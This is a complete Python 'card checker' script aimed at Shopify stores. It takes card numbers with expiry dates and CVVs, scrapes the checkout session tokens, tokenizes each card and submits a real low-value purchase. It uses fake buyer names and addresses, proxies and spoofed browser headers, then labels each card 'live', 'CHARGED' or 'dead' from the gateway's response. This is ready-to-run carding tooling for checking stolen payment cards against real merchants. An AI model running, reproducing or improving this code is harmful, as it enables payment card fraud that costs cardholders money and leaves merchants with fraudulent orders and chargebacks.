#!/usr/bin/env python3
import sys
import json
import time
import re
import urllib3
import requests
from urllib.parse import urlparse
from fake_useragent import UserAgent

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MAX_RETRIES = 5

def log(msg):
    print(f"[LOG] {msg}", file=sys.stderr, flush=True)

def find_between(content, start, end):
    try:
        start_pos = content.index(start) + len(start)
        end_pos = content.index(end, start_pos)
        return content[start_pos:end_pos]
    except ValueError:
        return ''

def get_proxy(proxy_str):
    if not proxy_str or proxy_str.strip() == '':
        return None
    parts = proxy_str.strip().split(':')
    if len(parts) >= 4:
        host, port, user = parts[0], parts[1], parts[2]
        password = ':'.join(parts[3:])
        proxy_url = f"http://{user}:{password}@{host}:{port}"
    elif len(parts) == 2:
        proxy_url = f"http://{parts[0]}:{parts[1]}"
    else:
        proxy_url = f"http://{proxy_str}"
    return {'http': proxy_url, 'https': proxy_url}

def make_request(url, method='GET', headers=None, json_data=None, data=None, cookies=None, proxy=None, timeout=20):
    for attempt in range(MAX_RETRIES):
        try:
            if method.upper() == 'GET':
                response = requests.get(url, headers=headers, proxies=proxy, verify=False, timeout=timeout, cookies=cookies, allow_redirects=True)
            elif method.upper() == 'POST':
                response = requests.post(url, headers=headers, json=json_data, data=data, proxies=proxy, verify=False, timeout=timeout, cookies=cookies)
            return response
        except Exception as e:
            log(f"[Retry {attempt+1}/{MAX_RETRIES}] Proxy error for {url}: {str(e)[:50]}")
            if attempt == MAX_RETRIES - 1:
                raise Exception(f"Failed after {MAX_RETRIES} attempts: {str(e)}")
            time.sleep(1)

def get_address_details(country_code):
    if country_code == 'US':
        return {'address': "420 Park ave", 'city': "New York", 'state': "NY", 'zip': "10016", 'phone': "(879) 658-2525", 'country': "United States", 'currency': "USD", 'zone_code': "NY", 'latitude': 41.1456, 'longitude': -73.9876}
    elif country_code == 'AU':
        return {'address': "134 Buckhurst Street", 'city': "South Melbourne", 'state': "VIC", 'zip': "3205", 'phone': "07 3803 6136", 'country': "Australia", 'currency': "AUD", 'zone_code': "VIC", 'latitude': -37.8351, 'longitude': 144.9571}
    else:
        return {'address': "133 New York 59", 'city': "Monsey", 'state': "NY", 'zip': "10952", 'phone': "(879) 658-2525", 'country': "United States", 'currency': "USD", 'zone_code': "NY", 'latitude': 41.1456, 'longitude': -73.9876}

def check_card(card_str, site_url, proxy_str):
    try:
        ua = UserAgent().chrome
    except:
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36"
    
    parts = card_str.strip().split('|')
    if len(parts) < 4:
        return {'status': 'error', 'message': '[ERROR] Invalid card format'}
    
    cc, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(year) <= 2:
        year = f"20{year}"
    sub_month = str(int(month))
    
    log(f"Card: {cc[:6]}****{cc[-4:]} | {month}/{year}")
    
    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    parsed_url = urlparse(site_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    domain = parsed_url.hostname
    
    log(f"Target: {domain}")
    proxy = get_proxy(proxy_str)
    if proxy:
        log("Proxy: Active")
    
    # ============================================================
    # Step 1: Find cheapest available product
    # ============================================================
    log("Step 1: Finding product...")
    try:
        products_url = f"{base_url}/products.json"
        headers = {'User-Agent': ua, 'Accept': 'application/json'}
        response = make_request(products_url, 'GET', headers=headers, proxy=proxy)
        
        if response.status_code != 200:
            return {'status': 'error', 'message': f'[ERROR] HTTP {response.status_code}'}
        
        data = response.json()
        if 'products' not in data:
            return {'status': 'error', 'message': '[ERROR] Not Shopify'}
        
        min_price = None
        best_variant = None
        product_title = ''
        
        for product in data['products']:
            for variant in product.get('variants', []):
                price = float(variant['price'])
                if price >= 0.01 and variant.get('available', True) is not False:
                    if min_price is None or price < min_price:
                        min_price = price
                        best_variant = variant
                        product_title = product['title']
        
        if not best_variant:
            return {'status': 'error', 'message': '[ERROR] No products'}
        
        prodid = best_variant['id']
        log(f"Product: {product_title} | ${min_price}")
    except Exception as e:
        return {'status': 'error', 'message': f'[ERROR] {str(e)[:50]}'}
    
    # ============================================================
    # Step 2: Get checkout session tokens
    # ============================================================
    log("Step 2: Getting session...")
    
    checkout_token = None
    web_build_id = None
    x_checkout_one_session_token = None
    queue_token = None
    stable_id = None
    payment_method_identifier = None
    country_code = 'US'
    
    for retry in range(MAX_RETRIES):
        try:
            cart_url = f"{base_url}/cart/{prodid}:1"
            headers = {
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9',
                'Sec-CH-UA': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
            }
            
            response = make_request(cart_url, 'GET', headers=headers, proxy=proxy)
            
            if 'recaptcha' in response.text.lower():
                return {'status': 'dead', 'message': '[DEAD] CAPTCHA'}
            
            final_url = response.url
            checkout_token = find_between(final_url, '/cn/', '?')
            if not checkout_token:
                checkout_token = find_between(final_url, '/checkouts/', '?')
            
            if not checkout_token:
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Checkout token not found in: {final_url}")
                continue
            
            web_build_id = find_between(response.text, '<meta name="serialized-environment" content="{&quot;commitSha&quot;:&quot;', '&quot;}')
            if not web_build_id:
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Web build id not found")
                continue
            
            x_checkout_one_session_token = find_between(response.text, '<meta name="serialized-session-token" content="&quot;', '&quot;"')
            if not x_checkout_one_session_token:
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Session token not found")
                continue
            
            queue_token = find_between(response.text, 'queueToken&quot;:&quot;', '&quot;')
            if not queue_token:
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Queue token not found")
                continue
            
            stable_id = find_between(response.text, 'stableId&quot;:&quot;', '&quot;')
            if not stable_id:
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Stable ID not found")
                continue
            
            payment_method_identifier = find_between(response.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            if not payment_method_identifier:
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Payment method identifier not found")
                continue
            
            country_code_match = re.search(r'"supportedCountries":"([^"]+)"', response.text)
            country_code = country_code_match.group(1) if country_code_match else 'US'
            
            log(f"All session tokens extracted | Country: {country_code}")
            break
            
        except Exception as e:
            log(f"[Retry {retry+1}/{MAX_RETRIES}] Error in Step 2: {str(e)[:50]}")
            continue
    else:
        return {'status': 'error', 'message': '[ERROR] Failed to get session after all retries'}
    
    # ============================================================
    # Step 3: Get card token/nonce
    # ============================================================
    log("Step 3: Getting card token...")
    cctoken = None
    
    for retry in range(MAX_RETRIES):
        try:
            token_headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.shopifycs.com',
                'referer': 'https://checkout.shopifycs.com/',
                'user-agent': ua
            }
            
            payload = {
                "credit_card": {"number": cc, "month": int(sub_month), "year": int(year), "verification_value": cvv, "name": "Hell King"},
                "payment_session_scope": domain
            }
            
            response = make_request("https://deposit.shopifycs.com/sessions", 'POST', headers=token_headers, json_data=payload, proxy=proxy)
            response_json = response.json()
            cctoken = response_json.get('id')
            
            if not cctoken:
                errors = response_json.get('errors', [])
                if errors:
                    return {'status': 'dead', 'message': f'[DEAD] {errors}'}
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Card token not returned")
                continue
            
            log(f"Card token received: {cctoken[:25]}...")
            break
            
        except Exception as e:
            log(f"[Retry {retry+1}/{MAX_RETRIES}] Error in Step 3: {str(e)[:50]}")
            continue
    else:
        return {'status': 'dead', 'message': '[DEAD] Card Token not found'}
    
    address = get_address_details(country_code)
    
    # ============================================================
    # Step 4: Get proposal and shipping rates
    # ============================================================
    log("Step 4: Getting proposal and shipping rates...")
    
    gateway_result = "Unknown Gateway"
    total_amount = str(min_price)
    handle = ""
    delivery_amount = "0"
    tax = "0"
    
    for retry in range(MAX_RETRIES):
        try:
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-GB',
                'content-type': 'application/json',
                'origin': base_url,
                'referer': f'{base_url}/',
                'user-agent': ua,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-build-id': web_build_id,
                'x-checkout-web-source-id': checkout_token
            }
            
            propayload = {
                "query": "query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}}}fragment BuyerProposalDetails on BuyerProposal{__typename}fragment ProposalDetails on SellerProposal{delivery{deliveryLines{availableDeliveryStrategies{handle amount{value{amount currencyCode}}}selectedDeliveryStrategy{handle}}}tax{totalTaxAmount{value{amount currencyCode}}}runningTotal{value{amount currencyCode}}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}__typename}__typename}}",
                "operationName": "Proposal",
                "variables": {
                    "sessionInput": {"sessionToken": x_checkout_one_session_token},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": address['address'], "address2": "", "city": address['city'],
                                    "countryCode": country_code, "postalCode": address['zip'],
                                    "firstName": "Hell", "lastName": "King", "zoneCode": address['zone_code'],
                                    "phone": address['phone'], "oneTimeUse": False,
                                    "coordinates": {"latitude": address['latitude'], "longitude": address['longitude']}
                                }
                            },
                            "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}},
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{prodid}", "variantId": f"gid://shopify/ProductVariant/{prodid}", "properties": [{"name": "_minimum_allowed", "value": {"string": ""}}], "sellingPlanId": None, "sellingPlanDigest": None}},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": str(min_price), "currencyCode": address['currency']}},
                            "lineComponentsSource": None, "lineComponents": []
                        }]
                    },
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": {"address1": address['address'], "address2": "", "city": address['city'], "countryCode": country_code, "postalCode": address['zip'], "firstName": "Hell", "lastName": "King", "zoneCode": address['zone_code'], "phone": address['phone']}}},
                    "buyerIdentity": {"customer": {"presentmentCurrency": address['currency'], "countryCode": country_code}, "email": "hellking@gmail.com", "emailChanged": False, "phoneCountryCode": country_code, "marketingConsent": [], "shopPayOptInPhone": {"countryCode": country_code}, "rememberMe": False},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None, "proposedTotalAmount": None, "proposedTotalIncludedAmount": {"value": {"amount": "0", "currencyCode": address['currency']}}, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False}
                }
            }
            
            response = make_request(f"{base_url}/checkouts/unstable/graphql", 'POST', headers=headers, json_data=propayload, proxy=proxy)
            
            if response.status_code != 200:
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Proposal request failed with status {response.status_code}")
                continue
            
            data = response.json()
            
            gateway_info = re.search(r'"extensibilityDisplayName":"([^"]+)"', response.text)
            if gateway_info:
                gateway = gateway_info.group(1)
                gateway_result = f"Shopify + {gateway}" if gateway != "Shopify Payments" else "Shopify Payments"
            
            seller_proposal = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal")
            
            if not seller_proposal:
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Seller proposal not found")
                continue
            
            delivery_lines = seller_proposal.get("delivery", {}).get("deliveryLines", [{}])
            if delivery_lines:
                available_strategies = delivery_lines[0].get("availableDeliveryStrategies", [])
                if available_strategies:
                    handle = available_strategies[0].get("handle", "")
                    delivery_amount = available_strategies[0].get("amount", {}).get("value", {}).get("amount", "0")
                
                if not handle:
                    selected = delivery_lines[0].get("selectedDeliveryStrategy", {})
                    handle = selected.get("handle", "")
            
            if not handle:
                handle_search = re.search(r',"selectedDeliveryStrategy":\{"handle":"(.*?)","__typename":"DeliveryStrategyReference', response.text)
                handle = handle_search.group(1) if handle_search else ""
            
            if not handle:
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Handle is empty")
                continue
            
            tax = seller_proposal.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0")
            if not tax or tax == "0":
                tax_search = re.search(r',"totalAmountIncludedInTarget":\{"value":\{"amount":"(.*?)","currencyCode":"', response.text)
                tax = tax_search.group(1) if tax_search else "0"
            
            total_amount = seller_proposal.get("runningTotal", {}).get("value", {}).get("amount", str(min_price))
            
            log(f"Shipping handle: {handle}")
            log(f"Tax: ${tax}")
            log(f"Total: ${total_amount}")
            log(f"Gateway: {gateway_result}")
            break
            
        except Exception as e:
            log(f"[Retry {retry+1}/{MAX_RETRIES}] Error in Step 4: {str(e)[:50]}")
            continue
    else:
        return {'status': 'error', 'message': '[ERROR] Failed to get proposal after all retries'}
    
    # ============================================================
    # Step 5: Submit payment for completion
    # ============================================================
    log("Step 5: Submitting payment...")
    receipt_id = None
    
    for retry in range(MAX_RETRIES):
        try:
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': base_url,
                'priority': 'u=1, i',
                'referer': f'{base_url}/',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': ua,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'no',
                'x-checkout-web-source-id': checkout_token
            }
            
            payload = {
                "query": "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){__typename...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}__typename}__typename}}",
                "variables": {
                    "input": {
                        "sessionInput": {"sessionToken": x_checkout_one_session_token},
                        "queueToken": queue_token,
                        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines": [{
                                "destination": {"streetAddress": {"address1": address['address'], "address2": "", "city": address['city'], "countryCode": country_code, "postalCode": address['zip'], "firstName": "Hell", "lastName": "King", "zoneCode": address['zone_code'], "phone": address['phone'], "oneTimeUse": False, "coordinates": {"latitude": address['latitude'], "longitude": address['longitude']}}},
                                "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": handle, "customDeliveryRate": False}, "options": {}},
                                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                                "deliveryMethodTypes": ["SHIPPING"],
                                "expectedTotalPrice": {"value": {"amount": delivery_amount, "currencyCode": address['currency']}},
                                "destinationChanged": False
                            }],
                            "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True
                        },
                        "deliveryExpectations": {"deliveryExpectationLines": []},
                        "merchandise": {
                            "merchandiseLines": [{
                                "stableId": stable_id,
                                "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{prodid}", "variantId": f"gid://shopify/ProductVariant/{prodid}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                                "quantity": {"items": {"value": 1}},
                                "expectedTotalPrice": {"value": {"amount": str(min_price), "currencyCode": address['currency']}},
                                "lineComponentsSource": None, "lineComponents": []
                            }]
                        },
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [{
                                "paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": payment_method_identifier, "sessionId": cctoken, "billingAddress": {"streetAddress": {"address1": address['address'], "address2": "", "city": address['city'], "countryCode": country_code, "postalCode": address['zip'], "firstName": "Hell", "lastName": "King", "zoneCode": address['zone_code'], "phone": address['phone']}}, "cardSource": None}},
                                "amount": {"value": {"amount": total_amount, "currencyCode": address['currency']}},
                                "dueAt": None
                            }],
                            "billingAddress": {"streetAddress": {"address1": address['address'], "address2": "", "city": address['city'], "countryCode": country_code, "postalCode": address['zip'], "firstName": "Hell", "lastName": "King", "zoneCode": address['zone_code'], "phone": address['phone']}}
                        },
                        "buyerIdentity": {"customer": {"presentmentCurrency": address['currency'], "countryCode": country_code}, "email": "hellking@gmail.com", "emailChanged": False, "phoneCountryCode": country_code, "marketingConsent": [], "shopPayOptInPhone": {"countryCode": country_code}},
                        "tip": {"tipLines": []},
                        "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"value": {"amount": tax, "currencyCode": address['currency']}}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms": None,
                        "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                        "optionalDuties": {"buyerRefusesDuties": False}
                    },
                    "attemptToken": f"{checkout_token}-0a6d87fj9zmj",
                    "metafields": [],
                    "analytics": {
                        "requestUrl": f"{base_url}/checkouts/cn/{checkout_token}",
                        "pageId": stable_id
                    }
                },
                "operationName": "SubmitForCompletion"
            }
            
            submit_url = f'{base_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion'
            response = make_request(submit_url, 'POST', headers=headers, json_data=payload, proxy=proxy)
            response_text = response.text
            
            if 'CAPTCHA_METADATA_MISSING' in response_text:
                return {'status': 'dead', 'message': '[DEAD] CAPTCHA_REQUIRED'}
            
            response_json = response.json()
            receipt_id = response_json.get("data", {}).get("submitForCompletion", {}).get("receipt", {}).get("id")
            
            if receipt_id:
                log(f"Receipt ID received: {receipt_id}")
                break
            else:
                if 'CARD_DECLINED' in response_text or 'card_declined' in response_text.lower():
                    return {'status': 'dead', 'message': f'[DEAD] Card Declined | {gateway_result}'}
                elif 'INSUFFICIENT_FUNDS' in response_text:
                    return {'status': 'live', 'message': f'[CHARGED] INSUFFICIENT FUNDS! | Amount: ${total_amount}'}
                elif 'INCORRECT_CVC' in response_text:
                    return {'status': 'live', 'message': f'[CCN] INCORRECT CVC! | Amount: ${total_amount}'}
                elif 'INCORRECT_ZIP' in response_text:
                    return {'status': 'live', 'message': f'[CHARGED] INCORRECT ZIP! | Amount: ${total_amount}'}
                elif 'EXPIRED_CARD' in response_text:
                    return {'status': 'dead', 'message': f'[DEAD] Expired Card | {gateway_result}'}
                elif 'INVALID_NUMBER' in response_text or 'invalid_number' in response_text.lower():
                    return {'status': 'dead', 'message': f'[DEAD] Invalid Number | {gateway_result}'}
                elif 'PROCESSING_ERROR' in response_text:
                    return {'status': 'dead', 'message': f'[DEAD] Processing Error | {gateway_result}'}
                elif 'do_not_honor' in response_text.lower():
                    return {'status': 'dead', 'message': f'[DEAD] Do Not Honor | {gateway_result}'}
                elif 'generic_decline' in response_text.lower():
                    return {'status': 'dead', 'message': f'[DEAD] Generic Decline | {gateway_result}'}
                elif 'SubmitRejected' in response_text:
                    errors = response_json.get("data", {}).get("submitForCompletion", {}).get("errors", [])
                    if errors:
                        error_msg = errors[0].get("nonLocalizedMessage", "Rejected")
                        return {'status': 'dead', 'message': f'[DEAD] {error_msg} | {gateway_result}'}
                    return {'status': 'dead', 'message': f'[DEAD] Rejected | {gateway_result}'}
                
                log(f"[Retry {retry+1}/{MAX_RETRIES}] Receipt ID not found")
                time.sleep(1)
                continue
            
        except Exception as e:
            log(f"[Retry {retry+1}/{MAX_RETRIES}] Error in Step 5: {str(e)[:50]}")
            continue
    
    if not receipt_id:
        return {'status': 'dead', 'message': f'[DEAD] No Receipt | {gateway_result}'}
    
    # ============================================================
    # Step 6: Poll for final receipt status
    # ============================================================
    log("Step 6: Polling for final receipt status...")
    time.sleep(2)
    
    try:
        purl = f"{base_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
        phead = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': base_url,
            'referer': f'{base_url}/',
            'user-agent': ua,
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build_id,
            'x-checkout-web-source-id': checkout_token
        }
        
        pload = {
            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}analytics{checkoutCompletedEventId __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId customerOrdersCount eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename}',
            'variables': {
                'receiptId': receipt_id,
                'sessionToken': x_checkout_one_session_token
            },
            'operationName': 'PollForReceipt'
        }
        
        response = make_request(purl, 'POST', headers=phead, json_data=pload, proxy=proxy)
        response_json = response.json()
        response_text = json.dumps(response_json)
        
        if f"{base_url}/thank_you" in response_text or f"{base_url}/post_purchase" in response_text:
            return {'status': 'live', 'message': f'[CHARGED] SUCCESS! | Amount: ${total_amount} | Gateway: {gateway_result}'}
        elif 'Your order is confirmed' in response_text:
            return {'status': 'live', 'message': f'[ORDER PLACED] SUCCESS! | Amount: ${total_amount}'}
        elif 'INCORRECT_ZIP' in response_text:
            return {'status': 'live', 'message': f'[CHARGED] INCORRECT ZIP! | Amount: ${total_amount}'}
        elif 'INSUFFICIENT_FUNDS' in response_text:
            return {'status': 'live', 'message': f'[CHARGED] INSUFFICIENT FUNDS! | Amount: ${total_amount}'}
        elif 'INCORRECT_CVC' in response_text:
            return {'status': 'live', 'message': f'[CCN] INCORRECT CVC! | Amount: ${total_amount}'}
        elif 'CompletePaymentChallenge' in response_text or 'AUTHORIZATION_ERROR' in response_text:
            return {'status': 'live', 'message': f'[3DS] VERIFICATION REQUIRED! | Amount: ${total_amount}'}
        elif '/authentications/' in response_text:
            return {'status': 'live', 'message': f'[3DS] CARD REQUIRES 3D SECURE! | Amount: ${total_amount}'}
        elif 'processingError' in response_text:
            error_code = response_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'Unknown')
            return {'status': 'dead', 'message': f'[DEAD] {error_code} | Amount: ${total_amount}'}
        else:
            log(f"Unknown response: {response_text[:200]}")
            return {'status': 'unknown', 'message': f'[UNKNOWN] Response needs review | {gateway_result}'}
            
    except Exception as e:
        return {'status': 'dead', 'message': f'[ERROR] Poll: {str(e)[:40]}'}


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(json.dumps({'status': 'error', 'message': '[ERROR] Usage: checker.py <card> <site_url> [proxy]'}))
        sys.exit(1)
    
    card = sys.argv[1]
    site_url = sys.argv[2]
    proxy = sys.argv[3] if len(sys.argv) > 3 else ""
    
    result = check_card(card, site_url, proxy)
    print(json.dumps(result))
